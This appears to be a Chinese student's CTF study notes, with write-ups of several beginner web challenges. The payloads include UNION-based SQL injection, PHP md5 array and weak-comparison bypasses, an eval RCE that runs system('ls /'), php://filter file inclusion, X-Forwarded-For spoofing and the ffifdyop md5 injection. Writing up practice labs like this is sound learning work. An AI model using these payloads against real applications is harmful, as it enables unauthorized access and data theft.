# 刷题心得
## web
### [SWPUCTF 2021 新生赛]easy_sql
#### 思路和解题过程：
- 参考wp，从查询语句入手，接下来把查询语句和解释放下面作为参考
```
?wllm=1' order by 3 --+ 
这里？是用来隔开域名和查询语句的，参数是wllm，单引号是闭合sql中的字符串尝试注入错误查询参数，orderby是排列语句，表示按第3列排序，这里是通过 ORDER BY 来探测目标表的列数。通过不断增加数字（如 order by 4, order by 5），直到返回错误，就可以确定表的列数。（至少有几列）
?wllm=-1' union select 1,2,3 --+
-1 是一个不存在的值，目的是让原始查询返回空结果，从而让 UNION SELECT 的结果显示出来，SELECT 1,2,3 是攻击者构造的查询，目的是探测目标查询的列数，并确定哪些列会在页面上显示。这里的 1,2,3 是占位符，表示3列。如果目标查询的列数不是3，数据库会返回错误。
?wllm=-1' union select 1,2,database() --+
查询数据库名字
?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'--+
1 和 2 是占位符，用于填充目标查询的列。group_concat(table_name) 是MySQL中的一个函数，用于将多个行的值连接成一个字符串。这里的作用是从 information_schema.tables 中获取所有表名，并将它们连接成一个字符串。information_schema.tables 是MySQL中的一个系统表，存储了所有表的信息。table_schema='test_db' 是一个条件，用于筛选出属于 test_db 数据库的表。
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db'--+
中获取所有列名
?wllm=-1' union select 1,2,flag from test_tb --+
查询 test_tb 表中的 flag 列
```

### [SWPUCTF 2021 新生赛]jicao
- 题目代码
```
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```
#### 思考：
- 学习web解题，请教deepseek，这里我提出了一些问题和思考
1. 是否有其他解题方法？
从代码逻辑来看，这道题目的解法是固定的，因为代码明确要求：
id必须通过POST传递，且值为"wllmNB"。
json必须通过GET传递，且其解析后的数组中x键的值为"wllm"。
因此，构造特定的POST和GET参数是唯一的解题方法。没有其他绕过条件的方式。
2. 为什么需要构造这样的请求？
根据代码逻辑，要触发echo $flag;，必须满足以下两个条件：
POST参数：id=wllmNB。
GET参数：json={"x":"wllm"}。
因此，你需要构造一个同时包含POST和GET参数的请求，才能满足条件并获取flag。
3. 为什么不能通过其他方式（如Payload）绕过？
代码逻辑简单直接
这段代码的逻辑非常简单，没有复杂的漏洞（如SQL注入、文件包含、反序列化等），因此无法通过构造Payload绕过。
条件判断严格
代码中的条件判断是严格的字符串比较（==），没有类型转换漏洞或其他可利用的弱点。
无其他输入点
代码只接受id（POST）和json（GET）两个输入点，没有其他可控的输入参数。
- 也就是说有漏洞才可以构造payload进行攻击
#### 解题过程：
- 配置代理和yakit抓包，抓到GET请求包后，结合ai的说明，将GET修改为POST，并在/后面添加?json={"x":"wllm"}，之后在最后一行加一个id=wllm,下面是完整的请求包内容
```
POST /?json={"x":"wllm"} HTTP/1.1
Host: node7.anna.nssctf.cn:24582
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1739753357,1740035328,1740366882,1740380846; HMACCOUNT=78F6B69C45C39043; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1740380899
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

id=wllmNB
```
- 发送之后得到的内容最下面就是flag了。
![](./images/抓包修改请求.png)

### [SWPUCTF 2021 新生赛]easy_md5
- 题目
```
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?>
wrong!
```
#### 思路：
- 和之前一样，大概是要判断name和password的md5值相等且本身内容不等，这里存在两种判断，是==和===的判断逻辑，网上可以查看解析判断。PHP中md5()函数无法处理数组（会返回NULL）来实现绕过
- 既要两变量个值不相同，又要两个变量md5值一样，
可以发现此时判断md5值是否一样用的是==，这是php的弱类型比较，
方法一： 可以使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等，而两个变量值不相等；
方法二： 可以传递数组，如name[]=123,password[]=456，md5不能加密数组，故两个md5返回的都是null

另：若遇到===这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同
- 那么需要构造请求，yakit抓包直接修改GET请求，改为POST，后面加上name【】数组=1，最后面加上password【】=2，但是直接发送会失败，询问ai原来是我缺少了Content-Type 头部，这是在POST，PUT,PATCH这类请求中必须的，GET请求一般没有，所以增加Content-Type: application/x-www-form-urlencoded，说明这是一种应用程序数据，后面是一种编码格式，它用于将表单数据编码成 URL 编码的格式，这种格式可以被服务器解析
![](./images/数组绕过.png)

### [SWPUCTF 2021 新生赛]easyrce
#### 题目代码
```
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```
#### 解题过程：
-  if(isset($_GET['url']))   
    isset函数用来检测url变量是否存在；$_GET函数获取变量数据
    {
    eval($_GET['url']);                                                           
    eval函数用来执行参数数据，并返回结果，其中字符串当作PHP代码来执行。
    }
    if判断语句告诉我们，如果存在url变量则往下面执行eval函数，执行参数并且返回结果。
- 选择system可以将结果直接返回浏览器不需要加echo.
- ?url=system("ls /");
    ?代表拼接
    ls /代表列出目录文件，学过Linux系统的大部分都有所了解。
    代码意思是将外部执行命令ls /的结果赋值给url变量，最后在浏览器中显示结果。
    注意以;英文分号进行闭合。
- 使用cat命令查看flllllaaaaaaggggggg文件中的命令，需注意的是文件在/根目录下：
    ?url=system("cat /flllllaaaaaaggggggg");
![](./images/执行字符串命令.png)

### [SWPUCTF 2021 新生赛]include
#### 解题思路和过程：
- 题目是include，而且说是传入一个file看看，那就在url后面加？file来看看，结果显示了一些php源码
```
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?> flag 在flag.php中
```
- 看最后一段发现有include函数，这里ini_set("allow_url_include","on");直接包含的话可能会执行php代码而不显示flag的值，而伪协议可以将代码也视作文本输出，那么构造?file=php://filter/convert.base64-encode/resource=flag.php，读取文件源码，并通过Base64编码绕过执行直接获取内容，伪协议的规则是php://filter/过滤器|过滤器/resource=待过滤的数据流，convert.base64-encode是一种过滤器，read是用来指定读取的文章内容利用管道符，来进行条件的再筛选；
![](./images/伪协议包含.png)

### [SWPUCTF 2021 新生赛]Do_you_know_http
#### 解题思路和过程：
- 抓包并根据题目修改user-agent为WLLM，然后发送请求包，发现了一个a.php文件，那么我们从url访问打开它，发现说是只能local访问，那么应在本地进行查询，这里X-Forwarded-For 用于表示经过代理服务器或负载均衡器的 HTTP 流量的原始 IP 地址，当 HTTP 请求经过 多个代理服务器 或 负载均衡器 时，X-Forwarded-For 的值可能包含 多个用逗号隔开的 IP 地址，而第一个 IP 地址通常就是 源客户端的 IP 地址
![](./images/修改agent.png)
- 注：在 HTTP 请求头中，通常 没有特定的请求头字段可以直接用于告诉页面客户端所使用的 IP 地址，因为 IP 地址是由 底层网络协议（如 TCP/IP） 处理的，而 HTTP 是应用层协议，主要关注 如何在不同计算机或设备之间的应用程序之间进行通信和数据交换。HTTP 请求头的主要目的是 提供与请求资源相关的元数据。 在 HTTP 报文经过 代理服务器 或 负载均衡器 时，通常会添加与客户端 IP 相关的 HTTP 请求头以指示 源客户端的 IP 地址。在这一过程中常使用到的 HTTP 请求头是 X-Forwarded-For。
![](./images/找到秘密.png)
- 在两次发包之后出现了秘密php，去访问发现flag在里边。

### [NCTF 2018]签到题
#### 题目描述：
- 打开是一个自动跳转到百度首页的网站，查看url发现是一个叫sercert.php的页面，打开看了看源码没有发现什么
#### 解题思路和过程：
- 其实我第一时间想到了去查看别的url比如index.php，想要找到些有趣的东西，但是输入访问后还是保留在了这个百度的首页面上，然后我去查看源码，js等，没什么收获。。
- 其实我还漏掉了关键一步就是在f12中查看网络这一项，打开网络后查看响应包，其中有ctf的身影，去网上查阅资料后才反应过来原来是重定向的问题，最开始我输入了index索引后是重定向直接跳回了百度，并没有达到我的index这里，在网络请求中可以看到访问index后显示302（旧的地址还会保留，301是旧的地址没有保留），其中的响应头发现了flag{}。。。。。
![](./images/重定向问题.png)
#### 总结：
- 重定向问题，在f12中查看网络请求，查看响应头，看看是302还是301，然后根据响应头中的location来进行下一步的操作。

### [BJDCTF 2020]easy_md5
#### 题目描述：
- 打开一个网页，有输入框，url的参数是password。
#### 解题思路和过程：
1. 首先输入任意内容，f12查看网页源码，这里在网络控制台中查看请求可以看到响应头中有一个hint提示了数据库的查询语句
![](./images/响应头绕过提示.png)
2. 在php中有一个函数叫做md5函数，这个函数得基本格式是：
```
<?php
	$a = '123';
	echo md5($a,true);
?>
```
![](./images/md5数据库语句.png)
- 可以用字符串ffifdyop绕过，绕过原理是：ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ' or '6
- 而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from 'admin' where password='' or '6xxxxx'，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。
![](./images/get绕过.png)
- 由于是get方式，我们可以构造payload：?a[]=1&b[]=2,之后来到新界面
![](./images/md最终.png)
- 然后按照之前学习的传入post参数两个数组进行绕过
![](./images/md5坎坷结果.png)
#### 总结：
- 第一步，提交一个参数，然后再响应头里面找到了hint。并且由此判断是一个sql注入 select * from 'admin' where password=md5($pass,true)
- 第二步，我们要想办法绕过这个md5(pass,true),如果我们提交一个字符串经过md5之后，然后又经过hex转assci码最终成为'or '6XXX'的话，我们就构造了一个万能钥匙，就可以得到另外一个页面
- 第三步，来到另一个页面，我们查看源码，发现需要给a,b两个变量传参典型弱类型匹配md5碰撞（0e开头）。而且md5不能处理数组，遇到数组不报错但是会将其转变成NULL
- 第四步, 又来到另外一个页面，代码审计，需要给param1和param2  post方式传递两个参数，这里用的强匹配===，不管是强类型还是弱类型，md5数组绕过就可以了，最终我们拿到了flag。

### 一张md5知识点长图
![](./images/md5-ctf.jpeg)

